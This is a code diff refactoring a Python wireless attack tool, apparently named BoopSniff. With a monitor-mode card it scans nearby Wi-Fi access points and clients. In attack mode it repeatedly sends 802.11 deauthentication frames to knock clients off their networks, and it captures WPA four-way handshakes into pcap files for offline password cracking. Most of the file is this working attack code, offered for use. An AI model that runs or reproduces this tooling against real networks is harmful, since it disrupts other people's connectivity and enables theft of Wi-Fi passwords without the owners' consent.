@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 __year__    = [2016, 2017]
-__status__  = "Testing"
+__status__  = "Stable"
 __contact__ = "jacobsin1996@gmail.com"
 
 # Imports
@@ -14,79 +14,67 @@ import pyric.pyw as pyw
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-from getpass import getuser
 from netaddr import *
 from os import system, path, getuid, uname
 from random import choice
 from scapy.contrib.wpa_eapol import WPA_key
 from scapy.all import *
-from sys import exit, stdout
+from sys import exit, stdout, stderr
 from tabulate import tabulate
 from threading import Thread
 from time import sleep, time
 
-
 conf.verb = 0
 
-# GLOBALS
-Global_Access_Points = {}   # MAC, AP OBJECT
-Global_Clients = {}         # MAC, CLIENT OBJECT
-
-Global_Mac_Filter_Channel = ""
-
-Global_Hidden_SSIDs = []
-Global_Ignore_Broadcast = ["ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "01:80:c2:00:00:00"]
-Global_Ignore_Multicast = ["01:00", "01:80:c2", "33:33"]
-
-Global_Print_Flag = True
-Global_Channel_Hopper_Flag = True
-
-Global_Handshakes = {} # "NETWORKS", "EAPOLS"
-Global_Mac_Filter = None
-Global_Start_Time = ""
-Global_Recent_Key_Cap = ""
-Global_Handshake_Captures = 0
-
-
 # CLASSES
-class bcolors:
+class c:
     HEADER    = "\033[95m"
     OKBLUE    = "\033[94m"
     OKGREEN   = "\033[92m"
-    WARNING   = "\033[93m"
     FAIL      = "\033[91m"
     ENDC      = "\033[0m"
     BOLD      = "\033[1m"
-    UNDERLINE = "\033[4m"
-
 
 class Configuration:
     def __init__(self):
         self.check_root()
         self.check_op()
+        self.start_time = time()
+
+        self.aps = {}
+        self.cls = {}
+
+        self.hidden = []
+
+        self.mac_filter_channel = ""
+        self.cap_message = ""
+
+        self.print_flag   = True
+        self.channel_flag = True
+
         return
 
     def user_force_variables_static(self):
-        self.printer = True
+        # Use this to force certain attributes about boop
         return
 
     def parse_interface(self, interface):
         if interface in pyw.interfaces() and pyw.modeget(interface) == "monitor":
             self.interface = interface
         else:
-            print(bcolors.FAIL + " [-] Non Monitor card selected.")
+            print(c.FAIL + " [-] Non Monitor card selected.")
             exit(0)
         return
 
     def parse_report(self, report):
-        if report:
+        if not report:
+            self.report = report
+        else:
             try:
                 system("touch "+report)
                 self.report = open(report, "w")
             except:
-                print(bcolors.FAIL+" [-] Report Location Invalid.")
-        else:
-            self.report = None
+                print(c.FAIL+" [-] Report Location Invalid.")
         return
 
     def parse_freq(self, freq):
@@ -110,18 +98,18 @@ class Configuration:
             elif str(self.frequency) == "5":
                 self.hop = True
             else:
-                print(bcolors.FAIL+" [-] Channel Setting incorrect.")
+                print(c.FAIL+" [-] Channel Setting incorrect.")
                 exit(0)
 
             self.channel = None
 
         elif channel != None:
             if str(self.frequency) == "2" and int(channel) in xrange(1, 12):
-                    self.hop = False
+                self.hop = False
             elif str(self.frequency) == "5" and int(channel) in _5_channels_:
-                    self.hop = False
+                self.hop = False
             else:
-                print(bcolors.FAIL+" [-] Channel Setting incorrect."+bcolors.ENDC)
+                print(c.FAIL+" [-] Channel Setting incorrect."+c.ENDC)
                 exit(0)
 
             self.channel = channel
@@ -131,11 +119,11 @@ class Configuration:
     def parse_kill(self, kill):
         if kill != False:
             commandlist = [
-        "service avahi-daemon stop",
-        "service network-manager stop",
-        "pkill wpa_supplicant",
-        "pkill dhclient"
-        ]
+                "service avahi-daemon stop",
+                "service network-manager stop",
+                "pkill wpa_supplicant",
+                "pkill dhclient"
+                ]
 
             for item in commandlist:
                 try:
@@ -175,7 +163,7 @@ class Configuration:
             "-r",
             "--report",
             action="store",
-            default=False,
+            default=None,
             dest="report",
             help="select a report location")
 
@@ -250,18 +238,16 @@ class Configuration:
 
     def check_root(self):
         if getuid() != 0:
-            print(bcolors.FAIL+" [-] User is not Root.")
+            print(c.FAIL+" [-] User is not Root.")
             exit()
-        print(bcolors.OKGREEN+" [+] User:     " + getuser())
+
         return
 
     def check_op(self):
         if uname()[0].startswith("Linux") and not "Darwin" not in uname()[0]:
-            print(bcolors.FAIL+" [-] Wrong OS.")
+            print(c.FAIL+" [-] Wrong OS.")
             exit()
 
-        print(bcolors.OKGREEN+" [+] Host OS:  " + str(uname()[0]))
-        print(bcolors.OKGREEN+" [+] Hostname: " + str(uname()[1])+bcolors.ENDC+bcolors.BOLD)
         return
 
 
@@ -274,7 +260,6 @@ class Access_Point:
         self.mven = ven[:8]
         self.msig = sig
         self.mbeacons = 1
-        self.meapols = 0
         return
 
     def update_ssid(self, ssid):
@@ -293,48 +278,30 @@ class Client:
 
 # HANDLER
 def handler_beacon(packet):
-    global Global_Access_Points
-    global Global_Clients
-    global Global_Mac_Filter
-    global Global_Mac_Filter_Channel
-    global Global_Handshakes
-
     source = packet.addr2
     mac = packet.addr3
 
-    if source in Global_Access_Points:
-        Global_Access_Points[source].msig = (get_rssi(packet.notdecoded))
-        Global_Access_Points[source].mbeacons += 1
+    if configuration.aps.has_key(source):
+        configuration.aps[source][0].msig = (get_rssi(packet.notdecoded))
+        configuration.aps[source][0].mbeacons += 1
 
-        if configuration.attack and Global_Access_Points[source].mbeacons % 50 == 0:
+        if configuration.attack and configuration.aps[source][0].mbeacons % 50 == 0:
             send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))
 
     else:
-
         destination = packet.addr1
-
-        if (not Global_Handshakes.has_key (mac)):
-            fields = {
-                'frame2': None,
-                'frame3': None,
-                'frame4': None,
-                'replay_counter': None,
-                'packets': []
-                }
-            Global_Handshakes[mac] = fields
 
         if packet.info and u"\x00" not in "".join([x if ord(x) < 128 else "" for x in packet.info]):
             name = packet.info.decode("utf-8")
-            Global_Handshakes[mac]['packets'].append(packet)
         else:
-            Global_Hidden_SSIDs.append(mac)
+            configuration.hidden.append(mac)
             name = "< len: "+str(len(packet.info))+" >"
 
         p = packet[Dot11Elt]
         cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
         "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split("+")
 
-        sec = set()
+        sec = []
         channel = ""
 
         while isinstance(p, Dot11Elt):
@@ -344,169 +311,172 @@ def handler_beacon(packet):
                 except:
                     pass
             elif p.ID == 48:
-                sec.add("WPA2")
+                if "WPA" in sec:
+                    sec.remove("WPA")
+                sec.append("WPA2")
             elif p.ID == 61:
                 if channel == "":
                     channel = ord(p.info[-int(p.len):-int(p.len)+1])
             elif p.ID == 221 and p.info.startswith("\x00P\xf2\x01\x01\x00"):
                 if "WPA2" not in sec:
-                    sec.add("WPA")
+                    sec.append("WPA")
 
             p = p.payload
 
-        if str(channel) != str(configuration.channel):
+        if configuration.hop == False and int(channel) != int(configuration.channel):
             return
 
-        if not sec:
+        if sec == []:
             if "privacy" in cap:
-                sec.add("WEP")
+                sec.append("WEP")
             else:
-                sec.add("OPEN")
+                sec.append("OPEN")
 
         if "0050f204104a000110104400010210" in str(packet).encode("hex"):
-            sec.add("WPS")
+            sec.append("WPS")
 
         try:
             oui = ((EUI(mac)).oui).registration().org
         except:
             oui = "< NA >"
 
-        Global_Access_Points[source] = Access_Point(
+        configuration.aps[source] = [Access_Point(
             name,
             ":".join(sec),
             channel,
             mac,
             unicode(oui),
-            get_rssi(packet[0].notdecoded))
+            get_rssi(packet[0].notdecoded)
+            ),
+                {
+                    'frame2': None,
+                    'frame3': None,
+                    'frame4': None,
+                    'replay_counter': None,
+                    'packets': [packet],
+                    'found': False
+                }
+            ]
 
-        if mac == Global_Mac_Filter:
-            Global_Mac_Filter_Channel = channel
+        if mac == configuration.mac_filter:
+            configuration.mac_filter_channel = channel
 
-        if configuration.attack and Global_Access_Points[mac].mbeacons % 100 == 0 and mac != configuration.skip:
+        if configuration.attack and configuration.aps[mac][0].mbeacons % 100 == 0 and mac != configuration.skip:
             send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))
 
     return
 
 
 def handler_data(packet):
-    global Global_Access_Points
-    global Global_Clients
-
     address1 = packet.addr1
     address2 = packet.addr2
     address3 = packet.addr3
 
-    if Global_Access_Points.has_key(address1):
-        if Global_Clients.has_key(address2):
+    if configuration.aps.has_key(address1):
+        if configuration.cls.has_key(address2):
 
-            if Global_Clients[address2].mbssid != address1:
-                Global_Clients[address2].mssid = (address1)
+            if configuration.cls[address2].mbssid != address1:
+                configuration.cls[address2].mssid = (address1)
 
-            Global_Clients[address2].mnoise += 1
-            Global_Clients[address2].msig = (get_rssi(packet.notdecoded))
+            configuration.cls[address2].mnoise += 1
+            configuration.cls[address2].msig = (get_rssi(packet.notdecoded))
 
-            if configuration.attack and Global_Clients[address2].mnoise % 25 == 0 and address2 != configuration.skip and address1 != configuration.skip:
+            if configuration.attack and configuration.cls[address2].mnoise % 25 == 0 and address2 != configuration.skip and address1 != configuration.skip:
                 send(Dot11(addr1=address2, addr2=address1, addr3=address1)/Dot11Deauth(), inter=(0.0), count=(1))
 
         elif check_valid(address2):
-            Global_Clients[address2] = Client(address2, address1, get_rssi(packet.notdecoded))
-            Global_Clients[address2].mnoise += 1
+            configuration.cls[address2] = Client(address2, address1, get_rssi(packet.notdecoded))
+            configuration.cls[address2].mnoise += 1
 
-    elif Global_Access_Points.has_key(address2):
-        if Global_Clients.has_key(address1):
+    elif configuration.aps.has_key(address2):
+        if configuration.cls.has_key(address1):
 
-            if Global_Clients[address1].mbssid != address2:
-                Global_Clients[address1].mssid = (address2)
+            if configuration.cls[address1].mbssid != address2:
+                configuration.cls[address1].mssid = (address2)
 
-            Global_Clients[address1].mnoise += 1
-            Global_Clients[address1].msig = (get_rssi(packet.notdecoded))
+            configuration.cls[address1].mnoise += 1
+            configuration.cls[address1].msig = (get_rssi(packet.notdecoded))
 
-            if configuration.attack and Global_Clients[address1].mnoise % 25 == 0 and address1 != configuration.skip and address2 != configuration.skip:
+            if configuration.attack and configuration.cls[address1].mnoise % 25 == 0 and address1 != configuration.skip and address2 != configuration.skip:
                 send(Dot11(addr1=address1, addr2=address2, addr3=address2)/Dot11Deauth(), inter=(0.0), count=(1))
 
         elif check_valid(address1):
-            Global_Clients[address1] = Client(address1, address2, get_rssi(packet.notdecoded))
-            Global_Clients[address1].mnoise += 1
+            configuration.cls[address1] = Client(address1, address2, get_rssi(packet.notdecoded))
+            configuration.cls[address1].mnoise += 1
 
     return
 
 
 def handler_eap(packet):
-    global Global_Access_Points
-    global Global_Handshakes
-    global Global_Recent_Key_Cap
-    global Global_Handshake_Captures
-
-    layer = packet.getlayer(WPA_key)
-
-    if (packet.FCfield & 1):
-        # Message come from packet.addr3 
-        # From DS = 0, To DS = 1
-        STA = packet.addr2
-    elif (packet.FCfield & 2):
-        # Message come from AP
-        # From DS = 1, To DS = 0
-        STA = packet.addr1
-    else:
+    if not configuration.aps.has_key(packet.addr3):
         return
 
-    key_info = layer.key_info
-    wpa_key_length = layer.wpa_key_length
-    replay_counter = layer.replay_counter
-    WPA_KEY_INFO_INSTALL = 64
-    WPA_KEY_INFO_ACK = 128
-    WPA_KEY_INFO_MIC = 256
-    # check for frame 2
-    if ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and (wpa_key_length > 0)):
-        Global_Handshakes[packet.addr3]['frame2'] = 1
-        Global_Handshakes[packet.addr3]['packets'].append (packet)
-    # check for frame 3
-    elif ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK) and (key_info & WPA_KEY_INFO_INSTALL)):
-        Global_Handshakes[packet.addr3]['frame3'] = 1
-        # store the replay counter for this packet.addr3
-        Global_Handshakes[packet.addr3]['replay_counter'] = replay_counter
-        Global_Handshakes[packet.addr3]['packets'].append(packet)
-    # check for frame 4
-    elif ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and Global_Handshakes[packet.addr3]['replay_counter'] == replay_counter):
-        Global_Handshakes[packet.addr3]['frame4'] = 1
-        Global_Handshakes[packet.addr3]['packets'].append (packet)
+    if configuration.aps[packet.addr3][1]['found'] == True:
+        return
 
-    if (Global_Handshakes[packet.addr3]['frame2'] and Global_Handshakes[packet.addr3]['frame3'] and Global_Handshakes[packet.addr3]['frame4']):
-        folder_path = ("pcaps/")
-        filename = (str(Global_Access_Points[packet.addr3].mssid)+"_"+str(packet.addr3)[-5:].replace(":", "")+".pcap")
+    else:
 
-        if not os.path.isfile(folder_path+filename):
-             os.system("touch "+folder_path+filename)
-             os.system("chmod 1777 "+folder_path+filename)
+        layer = packet.getlayer(WPA_key)
 
-        wrpcap (folder_path+filename, Global_Handshakes[packet.addr3]['packets'])
-        Global_Recent_Key_Cap = (" - [Booped: " + str(packet.addr3).upper() + "]")
-        Global_Handshake_Captures += 1
+        if (packet.FCfield & 1):
+            # From DS = 0, To DS = 1
+            STA = packet.addr2
+        elif (packet.FCfield & 2):
+            # From DS = 1, To DS = 0
+            STA = packet.addr1
+        else:
+            return
+
+        key_info = layer.key_info
+        wpa_key_length = layer.wpa_key_length
+        replay_counter = layer.replay_counter
+        WPA_KEY_INFO_INSTALL = 64
+        WPA_KEY_INFO_ACK = 128
+        WPA_KEY_INFO_MIC = 256
+        # check for frame 2
+        if ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and (wpa_key_length > 0)):
+            configuration.aps[packet.addr3][1]['frame2'] = 1
+            configuration.aps[packet.addr3][1]['packets'].append (packet)
+        # check for frame 3
+        elif ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK) and (key_info & WPA_KEY_INFO_INSTALL)):
+            configuration.aps[packet.addr3][1]['frame3'] = 1
+            configuration.aps[packet.addr3][1]['replay_counter'] = replay_counter
+            configuration.aps[packet.addr3][1]['packets'].append(packet)
+        # check for frame 4
+        elif ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and configuration.aps[packet.addr3][1]['replay_counter'] == replay_counter):
+            configuration.aps[packet.addr3][1]['frame4'] = 1
+            configuration.aps[packet.addr3][1]['packets'].append (packet)
+
+        if (configuration.aps[packet.addr3][1]['frame2'] and configuration.aps[packet.addr3][1]['frame3'] and configuration.aps[packet.addr3][1]['frame4']):
+            folder_path = ("pcaps/")
+            filename = (str(configuration.aps[packet.addr3][0].mssid)+"_"+str(packet.addr3)[-5:].replace(":", "")+".pcap")
+
+            if not os.path.isfile(folder_path+filename):
+                 os.system("touch "+folder_path+filename)
+                 os.system("chmod 1777 "+folder_path+filename)
+
+            wrpcap (folder_path+filename, configuration.aps[packet.addr3][1]['packets'])
+            configuration.aps[packet.addr3][1]['found'] = True
+            configuration.cap_message = (" - [Booped: "+c.FAIL + str(packet.addr3) +c.ENDC+"]")
     return
 
 
 def handler_probereq(packet):
-    global Global_Clients
-
-    if Global_Clients.has_key(packet.addr2):
-        Global_Clients[packet.addr2].msig = (get_rssi(packet.notdecoded))
+    if configuration.cls.has_key(packet.addr2):
+        configuration.cls[packet.addr2].msig = (get_rssi(packet.notdecoded))
 
     elif check_valid(packet.addr2):
-        Global_Clients[packet.addr2] = Client(packet.addr2, "", get_rssi(packet.notdecoded))
+        configuration.cls[packet.addr2] = Client(packet.addr2, "", get_rssi(packet.notdecoded))
 
-    Global_Clients[packet.addr2].mnoise += 1
+    configuration.cls[packet.addr2].mnoise += 1
 
     return
 
 
 def handler_proberes(packet):
-    global Global_Access_Points
-    global Global_Hidden_SSIDs
-    global Global_Handshakes
-
-    Global_Access_Points[packet.addr3].update_ssid(packet.info)
-    Global_Hidden_SSIDs.remove(packet.addr3)
-    Global_Handshakes[packet.addr3]['packets'].append(packet)
+    configuration.aps[packet.addr3][0].update_ssid(packet.info)
+    configuration.hidden.remove(packet.addr3)
+    configuration.aps[packet.addr3][1]['packets'].append(packet)
     return
 
 
@@ -522,10 +492,6 @@ def get_rssi(decoded):
 
 
 def channel_hopper(configuration):
-    global Global_Channel_Hopper_Flag
-    global Global_Mac_Filter_Channel
-
-
     interface = configuration.interface
     frequency = configuration.frequency
 
@@ -536,11 +502,6 @@ def channel_hopper(configuration):
             "2.442": 7, "2.447": 8, "2.452": 9,
             "2.457": 10, "2.462": 11
             }
-
-        for channel in ["2.412", "2.437", "2.462"]:
-            system("sudo iwconfig "+interface+" freq "+channel+"G")
-            configuration.channel = __FREQS__[channel]
-            sleep(5)
 
     elif frequency == "5":
         __FREQS__ = {
@@ -553,49 +514,44 @@ def channel_hopper(configuration):
             "5.785": 157, "5.805": 161, "5.825": 165
         }
 
-    while Global_Channel_Hopper_Flag == True:
-        if Global_Mac_Filter_Channel != "":
-            channel = __FREQS__.keys()[__FREQS__.values().index(Global_Mac_Filter_Channel)]
+    while configuration.channel_flag == True:
+        if configuration.mac_filter_channel != "":
+            channel = __FREQS__.keys()[__FREQS__.values().index(configuration.mac_filter_channel)]
             system("sudo iwconfig "+interface+" freq "+channel+"G")
-            configuration.channel = Global_Mac_Filter_Channel
+            configuration.channel = configuration.mac_filter_channel
             break
 
         channel = str(choice(__FREQS__.keys()))
         system("sudo iwconfig "+interface+" freq "+channel+"G")
 
         configuration.channel = __FREQS__[channel]
-
-        sleep(3)
+        sleep(2.5)
     return
 
 
 def get_access_points(AP):
-    global Global_Access_Points
-
     return [
-        Global_Access_Points[AP].mmac,
-        Global_Access_Points[AP].menc,
-        Global_Access_Points[AP].mch,
-        Global_Access_Points[AP].mven,
-        Global_Access_Points[AP].msig,
-        Global_Access_Points[AP].mbeacons,
-        Global_Access_Points[AP].mssid[:15]
+        configuration.aps[AP][0].mmac,
+        configuration.aps[AP][0].menc,
+        configuration.aps[AP][0].mch,
+        configuration.aps[AP][0].mven,
+        configuration.aps[AP][0].msig,
+        configuration.aps[AP][0].mbeacons,
+        configuration.aps[AP][0].mssid[:15]
     ]
 
 
 def get_clients():
-    global Global_Access_Points
-
     clients = []
-    for cl in Global_Clients:
+    for cl in configuration.cls:
         try:
-            if len(Global_Access_Points[Global_Clients[cl].mbssid].mssid) > 0:
+            if len(configuration.aps[configuration.cls[cl].mbssid][0].mssid) > 0:
                 clients.append([
-                    Global_Clients[cl].mmac,
-                    Global_Access_Points[Global_Clients[cl].mbssid].mmac,
-                    str(Global_Clients[cl].mnoise),
-                    str(Global_Clients[cl].msig),
-                    Global_Access_Points[Global_Clients[cl].mbssid].mssid
+                    configuration.cls[cl].mmac,
+                    configuration.aps[configuration.cls[cl].mbssid][0].mmac,
+                    str(configuration.cls[cl].mnoise),
+                    str(configuration.cls[cl].msig),
+                    configuration.aps[configuration.cls[cl].mbssid][0].mssid
                 ])
         except:
             pass
@@ -603,68 +559,65 @@ def get_clients():
 
 
 def get_un_clients():
-    global Global_Access_Points
-    global Global_Clients
-
     clients = []
-    for cl in Global_Clients:
+    for cl in configuration.cls:
         try:
             clients.append([
-                Global_Clients[cl].mmac,
-                Global_Access_Points[Global_Clients[cl].mbssid].mmac,
-                str(Global_Clients[cl].mnoise),
-                str(Global_Clients[cl].msig),
-                Global_Access_Points[Global_Clients[cl].mbssid].mssid
+                configuration.cls[cl].mmac,
+                configuration.aps[configuration.cls[cl].mbssid][0].mmac,
+                str(configuration.cls[cl].mnoise),
+                str(configuration.cls[cl].msig),
+                configuration.aps[configuration.cls[cl].mbssid][0].mssid
             ])
 
         except:
             clients.append([
-                Global_Clients[cl].mmac,
+                configuration.cls[cl].mmac,
                 "",
-                str(Global_Clients[cl].mnoise),
-                str(Global_Clients[cl].msig),
+                str(configuration.cls[cl].mnoise),
+                str(configuration.cls[cl].msig),
                 ""
             ])
     return clients
 
 
-def printer_thread(configuration):
-    global Global_Clients
-    global Global_Access_Points
-    global Global_Start_Time
-    global Global_Recent_Key_Cap
-    global Global_Print_Flag
-    global Global_Handshake_Captures
-
+def printer_thread():
     typetable = "simple"
     timeout = 1.5
 
     sleep(timeout)
 
-    while Global_Print_Flag == True:
-        wifis = list(map(get_access_points, Global_Access_Points))
+    while configuration.print_flag == True:
+        wifis = list(map(get_access_points, configuration.aps))
         wifis.sort(key=lambda x: (x[6]))
 
         if configuration.unassociated == True:		# print all clients no matter what
             clients = get_un_clients()
         else:
-            clients = get_clients()	     		# only print associated clients
+            clients = get_clients()	     		    # only print associated clients
 
         clients.sort(key=lambda x: (x[4]))
 
-        time_elapsed = int(time() - Global_Start_Time)
+        time_elapsed = int(time() - configuration.start_time)
 
-        if time_elapsed < 60:
-            printable_time = seconds = str(int(time_elapsed % 60))+" s"
+        hours = time_elapsed / 3600
+        mins = (time_elapsed % 3600) / 60
+        secs = time_elapsed % 60
+        if hours > 0:
+            printable_time = "%d h %d m %d s" % (hours, mins, secs)
+
+        elif mins > 0:
+            printable_time = "%d m %d s" % (mins, secs)
+
         else:
-            printable_time = str(int(time_elapsed / 60))+" m"
+            printable_time = "%d s" % secs
 
-        system('clear')
-        #
-        print(bcolors.ENDC+"[+] Time: [" + printable_time + "] Slithering: ["+str(configuration.channel)+"]" + Global_Recent_Key_Cap + " - ["+str(Global_Handshake_Captures)+"]")
+        stderr.write("\x1b[2J\x1b[H")
+
+        print(c.OKGREEN+"["+c.ENDC+"+"+c.OKGREEN+"] "+c.ENDC+"Time: "+c.OKBLUE+"[" + printable_time + "] "+c.ENDC+"Slithering: "+c.HEADER+"["+str(configuration.channel)+"]" + c.ENDC + configuration.cap_message)
         print("")
         print(tabulate(wifis, headers=["Mac Addr", "Enc", "Ch", "Vendor", "Sig", "Bea", "SSID"], tablefmt=typetable))
-        print(bcolors.ENDC)
+        print("")
         print(tabulate(clients, headers=["Mac", "AP Mac", "Noise", "Sig", "AP SSID"], tablefmt=typetable))
 
         if timeout < 4:
@@ -675,28 +628,24 @@ def printer_thread(configuration):
 
 
 def sniff_packets(packet):
-    global Global_Mac_Filter
-    global Global_Ignore_Broadcast
-    global Global_Hidden_SSIDs
-
-    if (Global_Mac_Filter == None or (packet.addr1 == Global_Mac_Filter or packet.addr2 == Global_Mac_Filter)):
+    if (configuration.mac_filter == None or (packet.addr1 == configuration.mac_filter or packet.addr2 == configuration.mac_filter)):
 
         if packet.type == 0:
-            if packet.subtype == 4:
+            if packet.subtype == 4 and configuration.unassociated:
                 handler_probereq(packet)
 
-            elif packet.subtype == 5 and packet.addr3 in Global_Hidden_SSIDs:
+            elif packet.subtype == 5 and packet.addr3 in configuration.hidden:
                 handler_proberes(packet)
 
             elif packet.subtype == 8:
                 handler_beacon(packet)
 
         elif packet.type == 1:
-            if packet.addr1 not in Global_Ignore_Broadcast and packet.addr2 and packet.addr2 not in Global_Ignore_Broadcast:
+            if check_valid(packet.addr1) and check_valid(packet.addr2):
                 handler_data(packet)
 
         elif packet.type == 2:
-            if packet.addr1 not in Global_Ignore_Broadcast and packet.addr2 not in Global_Ignore_Broadcast:
+            if check_valid(packet.addr1) and check_valid(packet.addr2):
                 handler_data(packet)
 
             if packet.haslayer(WPA_key):
@@ -705,14 +654,13 @@ def sniff_packets(packet):
     return
 
 
-# MISC
 def set_size(height, width):
     stdout.write("\x1b[8;{rows};{cols}t".format(rows=height, cols=width))
     return
 
 
 def display_art():
-    print(bcolors.OKBLUE+"""
+    print(c.OKBLUE+"""
     ____                   _____       _ ________
    / __ )____  ____  ____ / ___/____  (_) __/ __/
   / __  / __ \/ __ \/ __ \\\__ \/ __ \/ / /_/ /_
@@ -720,27 +668,25 @@ def display_art():
 /_____/\____/\____/ .___/____/_/ /_/_/_/ /_/
                  /_/
     """)
-    print(bcolors.HEADER+"     Codename: Inland Taipan\r\n"+bcolors.BOLD)
+    print(c.HEADER+"     Codename: Inland Taipan\r\n"+c.BOLD)
     return
 
 
-def check_valid(mac):
-    global Global_Ignore_Broadcast
-    global Global_Ignore_Multicast
-
-    if mac in Global_Ignore_Broadcast:
+def check_valid(mac=None):
+    if not mac:
         return False
 
-    for item in Global_Ignore_Multicast:
-        if mac.startswith(item):
-            return False
+    else:
+        for item in ["ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "01:80:c2:00:00:00", "01:00:5e", "01:80:c2", "33:33"]:
+            if mac.startswith(item):
+                return False
     return True
 
 
 def create_pcap_filepath():
-    if not os.path.isdir("pcaps"):
-        os.system("mkdir pcaps")
-        os.system("chmod 1777 pcaps/")
+    if not path.isdir("pcaps"):
+        system("mkdir pcaps")
+        system("chmod 1777 pcaps/")
     return
 
 
@@ -749,32 +695,22 @@ def start_sniffer(configuration):
     return
 
 
-# MAIN CONTROLLER
-def int_main(configuration):
-    global Global_Mac_Filter
-    global Global_Print_Flag
-    global Global_Channel_Hopper_Flag
-    global Global_Access_Points
-    global Global_Clients
-    global Global_Start_Time
-
-    Global_Mac_Filter = configuration.mac_filter
-
+def main():
     def signal_handler(*args):
-        Global_Print_Flag = False
-        Global_Channel_Hopper_Flag  = False
+        configuration.print_flag = False
+        configuration.channel_flag  = False
 
         if configuration.report != None:
-            wifis = list(map(get_Global_Access_Points, Global_Access_Points))
+            wifis = list(map(get_access_points, configuration.aps))
 
-            clients = list(map(get_clients, Global_Clients))
+            clients = list(map(get_clients, configuration.cls))
             clients.sort(key=lambda x: x[4])
 
             configuration.report.write(tabulate(wifis, headers=["M", "E", "Ch", "V", "S", "B", "SS"], tablefmt="psql")+"\r\n")
             configuration.report.write(tabulate(clients, headers=["M", "AP M", "N", "S", "AP"], tablefmt="psql")+"\r\n")
             configuration.report.close()
 
-        print(bcolors.OKGREEN+"\r [+] "+bcolors.ENDC+"Commit to Exit.")
+        print(c.OKGREEN+"\r [+] "+c.ENDC+"Commit to Exit.")
         exit(0)
         return 0
 
@@ -787,27 +723,23 @@ def int_main(configuration):
     else:
         os.system("iwconfig " + configuration.interface + " channel " + configuration.channel)
 
-    Global_Start_Time = time()
-
     Sniffer_Thread = Thread(target=start_sniffer, args=[configuration])
     Sniffer_Thread.daemon = True
     Sniffer_Thread.start()
 
-    create_pcap_filepath()
-    set_size(50, 83)
-
-    if configuration.printer == True:
-        printer_thread(configuration)
+    printer_thread()
 
     return 0
 
 
 if __name__ == "__main__":
+    create_pcap_filepath()
+    set_size(50, 83)
     display_art()
 
     configuration = Configuration()
     configuration.parse_args()
     conf.iface = configuration.interface
 
-    int_main(configuration)
-    # 800: Goal 750
+    main()
+    # 830: Goal 800
